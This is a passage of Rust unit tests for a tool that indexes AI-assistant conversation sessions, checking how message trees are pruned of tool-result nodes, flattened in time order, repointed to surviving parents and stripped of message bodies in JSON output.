                    r#"{{"uuid":"ob1","parentUuid":null,"isSidechain":false,"timestamp":"2026-01-15T10:00:00Z","type":"user","sessionId":"{id}","cwd":"/tmp/someproject","message":{{"role":"user","content":"<observed_from_primary_session>   <what_happened>Read</what_happened> </observed_from_primary_session>"}}}}"#
                ),
                format_args!(
                    r#"{{"uuid":"ob2","parentUuid":"ob1","isSidechain":false,"timestamp":"2026-01-15T10:01:00Z","type":"assistant","sessionId":"{id}","cwd":"/tmp/someproject","message":{{"role":"assistant","content":"<observation><type>discovery</type></observation>"}}}}"#
                ),
            ),
        )
        .unwrap();

        let db_dir = tempfile::tempdir().unwrap();
        let db_path = db_dir.path().join("index.db");
        let db_path = db_path.to_str().unwrap();
        ConversationIndexer::new(db_path, true).unwrap();

        let tree = lookup_tree(db_path, id, Some(&roots)).unwrap();
        let error = tree.error.expect("an excluded session is still an error");
        assert!(
            error.contains("excluded from the index"),
            "expected an exclusion message, got: {}",
            error
        );
    }
}

#[cfg(test)]
mod tree_filter_tests {
    use super::{filter_tree, flatten_tree, is_tool_node, note_empty_filter, prune_tree, TreeOpts};
    use crate::search::{ConversationTree, TreeNode};

    fn node(uuid: &str, parent: Option<&str>, role: &str, body: &str, depth: i64) -> TreeNode {
        TreeNode {
            message_uuid: uuid.to_string(),
            session_id: "s1".to_string(),
            parent_uuid: parent.map(str::to_string),
            is_sidechain: false,
            depth,
            timestamp: "2026-01-15T10:00:00Z".to_string(),
            message_type: role.to_string(),
            project_path: Some("/tmp/p".to_string()),
            summary: Some(body.chars().take(20).collect()),
            full_content: body.to_string(),
            model: None,
            is_abandoned: false,
            children: Vec::new(),
        }
    }

    /// user -> [Tool result] -> user, so pruning the middle must not take the leaf with it.
    fn sandwich() -> Vec<TreeNode> {
        let mut root = node("u1", None, "user", "please read the file", 0);
        let mut tool = node("t1", Some("u1"), "user", "[Tool result]", 1);
        let mut leaf = node("u2", Some("t1"), "user", "thanks, now explain it", 2);
        tool.timestamp = "2026-01-15T10:01:00Z".to_string();
        leaf.timestamp = "2026-01-15T10:02:00Z".to_string();
        tool.children = vec![leaf];
        root.children = vec![tool];
        vec![root]
    }

    #[test]
    fn pruning_lifts_survivors_into_the_dropped_nodes_place() {
        let kept = prune_tree(sandwich(), None, &|n| !is_tool_node(n));
        assert_eq!(kept.len(), 1);
        assert_eq!(kept[0].message_uuid, "u1");
        // The leaf must survive its filtered parent, not vanish with the subtree.
        assert_eq!(kept[0].children.len(), 1);
        assert_eq!(kept[0].children[0].message_uuid, "u2");
    }

    #[test]
    fn pruning_repoints_parent_uuid_at_the_nearest_survivor() {
        let kept = prune_tree(sandwich(), None, &|n| !is_tool_node(n));
        // Left pointing at "t1" the JSON would name a node that is no longer in the tree.
        assert_eq!(kept[0].children[0].parent_uuid.as_deref(), Some("u1"));
        assert_eq!(kept[0].parent_uuid, None);
    }

    #[test]
    fn role_filter_drops_only_the_other_role() {
        let mut root = node("u1", None, "user", "a question worth keeping", 0);
        root.children = vec![node("a1", Some("u1"), "assistant", "an answer", 1)];
        let kept = prune_tree(vec![root], None, &|n| n.message_type == "user");
        assert_eq!(kept.len(), 1);
        assert!(kept[0].children.is_empty());
    }

    #[test]
    fn tool_nodes_are_recognised_by_their_placeholder_bodies() {
        assert!(is_tool_node(&node("x", None, "user", "[Tool result]", 0)));
        // Short [Tool: Read] nodes must be dropped too. summarization::is_tool_noise keeps
        // those, which is why this predicate is separate.
        assert!(is_tool_node(&node(
            "x",
            None,
            "assistant",
            "[Tool: Read]",
            0
        )));
        assert!(is_tool_node(&node(
            "x",
            None,
            "user",
            "[Request interrupted by user]",
            0
        )));
        assert!(is_tool_node(&node("x", None, "user", "   ", 0)));
        assert!(!is_tool_node(&node("x", None, "user", "a real message", 0)));
    }

    fn opts(role: Option<&str>, no_tools: bool, flat: bool) -> TreeOpts {
        TreeOpts {
            role: role.map(str::to_string),
            no_tools,
            flat,
            content: false,
            content_chars: 300,
            json: true,
        }
    }

    fn conversation(nodes: Vec<TreeNode>, total: usize) -> ConversationTree {
        ConversationTree {
            conversation: None,
            tree: nodes,
            total_messages: total,
            warning: None,
            error: None,
        }
    }

    #[test]
    fn filtering_counts_only_the_surviving_nodes() {
        let mut tree = conversation(sandwich(), 3);
        let returned = filter_tree(&mut tree, &opts(None, true, false));
        assert_eq!(returned, 2, "the [Tool result] node is gone");
        // total_messages keeps meaning "messages in the session", not "rows returned".
        assert_eq!(tree.total_messages, 3);
    }

    #[test]
    fn filtering_everything_away_is_reported_rather_than_looking_empty() {
        let tool_only = vec![node("t1", None, "user", "[Tool result]", 0)];
        let mut tree = conversation(tool_only, 1);
        let returned = filter_tree(&mut tree, &opts(None, true, false));
        assert_eq!(returned, 0);
        assert!(tree.tree.is_empty());
    }

    #[test]
    fn an_empty_filter_result_keeps_an_existing_repair_warning() {
        // The raw-transcript fallback puts "run index --all to repair the DB" here. Losing
        // it would leave a broken index looking like nothing more than a strict filter.
        let tool_only = vec![node("t1", None, "user", "[Tool result]", 0)];
        let mut tree = conversation(tool_only, 1);
        tree.warning = Some("Indexed messages are missing; run index --all.".to_string());
        let returned = filter_tree(&mut tree, &opts(None, true, false));
        note_empty_filter(&mut tree, returned);
        let warning = tree.warning.expect("both notes should be present");
        assert!(warning.contains("run index --all"), "got: {}", warning);
        assert!(warning.contains("0 of 1 messages"), "got: {}", warning);
    }

    /// The combination the fzf preview ships with. Flattening before pruning compiles and
    /// returns the same count, but sets every `parent_uuid` to None -- silently undoing the
    /// reconstruction guarantee `pruning_repoints_parent_uuid_at_the_nearest_survivor` pins.
    #[test]
    fn filtering_and_flattening_together_keep_the_repointed_parents() {
        let mut tree = conversation(sandwich(), 3);
        let returned = filter_tree(&mut tree, &opts(None, true, true));
        assert_eq!(returned, 2);
        assert_eq!(tree.tree.len(), 2, "flat: both nodes are top level");
        assert!(tree.tree.iter().all(|n| n.children.is_empty()));
        assert_eq!(tree.tree[0].parent_uuid, None);
        assert_eq!(tree.tree[1].parent_uuid.as_deref(), Some("u1"));
    }

    #[test]
    fn an_unfiltered_tree_is_returned_untouched() {
        let mut tree = conversation(sandwich(), 3);
        let returned = filter_tree(&mut tree, &opts(None, false, false));
        assert_eq!(returned, 3);
        assert_eq!(tree.tree[0].message_uuid, "u1");
    }

    /// Multi-root sessions (resume, sidechain, pruned parent) interleave in time. The fzf
    /// preview takes `.[-12:]` as "the most recent messages", so a depth-first order would
    /// hand it the tail of the last subtree instead.
    #[test]
    fn flattening_orders_interleaved_roots_by_time() {
        let mut r1 = node("r1", None, "user", "first root", 0);
        r1.timestamp = "2026-01-15T10:00:00Z".to_string();
        let mut c1 = node("c1", Some("r1"), "assistant", "reply under first root", 1);
        c1.timestamp = "2026-01-15T10:02:00Z".to_string();
        r1.children = vec![c1];

        let mut r2 = node("r2", None, "user", "second root", 0);
        r2.timestamp = "2026-01-15T10:01:00Z".to_string();

        let flat = flatten_tree(vec![r1, r2]);
        let ids: Vec<&str> = flat.iter().map(|n| n.message_uuid.as_str()).collect();
        assert_eq!(ids, vec!["r1", "r2", "c1"]);
    }

    #[test]
    fn flattening_preserves_transcript_order_and_depth() {
        let flat = flatten_tree(sandwich());
        let ids: Vec<&str> = flat.iter().map(|n| n.message_uuid.as_str()).collect();
        assert_eq!(ids, vec!["u1", "t1", "u2"]);
        assert_eq!(
            flat.iter().map(|n| n.depth).collect::<Vec<_>>(),
            vec![0, 1, 2]
        );
        assert!(flat.iter().all(|n| n.children.is_empty()));
    }
}

#[cfg(test)]
mod tree_json_tests {
    use super::{apply_tree_content, TreeOpts};

    fn opts(content: bool, content_chars: usize) -> TreeOpts {
        TreeOpts {
            role: None,
            no_tools: false,
            flat: false,
            content,
            content_chars,
            json: true,
        }
    }

    fn tree_json() -> serde_json::Value {
        serde_json::json!({
            "tree": [{
                "message_uuid": "u1",
                "full_content": "abcdefghij",
                "children": [{
                    "message_uuid": "u2",
                    "full_content": "xyz",
                    "children": []
                }]
            }]
        })
    }

    fn bodies(v: &serde_json::Value) -> Vec<Option<String>> {
        fn walk(node: &serde_json::Value, out: &mut Vec<Option<String>>) {
            out.push(
                node.get("full_content")
                    .and_then(|b| b.as_str())
                    .map(str::to_string),
            );
            for child in node["children"].as_array().into_iter().flatten() {
                walk(child, out);
            }
        }
        let mut out = Vec::new();
        for node in v["tree"].as_array().into_iter().flatten() {
            walk(node, &mut out);
        }
        out
    }

    /// Anchored on the real type, not a hand-written literal: renaming `tree`, `children`
    /// or `full_content` would make `apply_tree_content` a silent no-op -- `get_mut("tree")`
    /// returns None and every body ships -- while the literal-based tests below stay green.
    #[test]
    fn bodies_are_stripped_from_a_real_serialized_tree() {
        use crate::search::{ConversationTree, TreeNode};

        fn node(uuid: &str, children: Vec<TreeNode>) -> TreeNode {
            TreeNode {
                message_uuid: uuid.to_string(),
                session_id: "s1".to_string(),
                parent_uuid: None,
                is_sidechain: false,
                depth: 0,
                timestamp: "2026-01-15T10:00:00Z".to_string(),
                message_type: "user".to_string(),
                project_path: None,
                summary: Some("s".to_string()),
                full_content: "a body that must not ship by default".to_string(),
                model: None,
                is_abandoned: false,
                children,
            }
        }

        let tree = ConversationTree {
            conversation: None,
            tree: vec![node("root", vec![node("child", vec![])])],
            total_messages: 2,
            warning: None,
            error: None,
        };
        let mut value = serde_json::to_value(&tree).unwrap();
        apply_tree_content(&mut value, &opts(false, 300));

        let bodies = value.to_string().matches("full_content").count();
        assert_eq!(bodies, 0, "serialized tree still carries bodies: {}", value);
    }

    #[test]
    fn without_content_every_body_is_dropped() {
        // The default has to stay small enough that a long session does not swamp an
        // agent's context window.
        let mut v = tree_json();
        apply_tree_content(&mut v, &opts(false, 300));
        assert_eq!(bodies(&v), vec![None, None]);
        // Nested nodes must be reached too, not just roots.
        assert!(v["tree"][0]["children"][0]["message_uuid"] == "u2");
    }

    #[test]
    fn with_content_bodies_are_truncated_and_flagged() {
        let mut v = tree_json();
        apply_tree_content(&mut v, &opts(true, 4));
        assert_eq!(
            bodies(&v),
            vec![Some("abcd".to_string()), Some("xyz".to_string())]
        );
        assert_eq!(v["tree"][0]["full_content_truncated"], true);
        assert_eq!(v["tree"][0]["children"][0]["full_content_truncated"], false);
    }

    #[test]
    fn the_truncation_flag_is_written_on_every_node() {
        // `search` always writes it; omitting it on untruncated nodes would force consumers
        // to handle two shapes for the same field.
        let mut v = tree_json();
        apply_tree_content(&mut v, &opts(true, 999));
        assert!(v["tree"][0].get("full_content_truncated").is_some());
        assert!(v["tree"][0]["children"][0]
            .get("full_content_truncated")
            .is_some());
    }
}
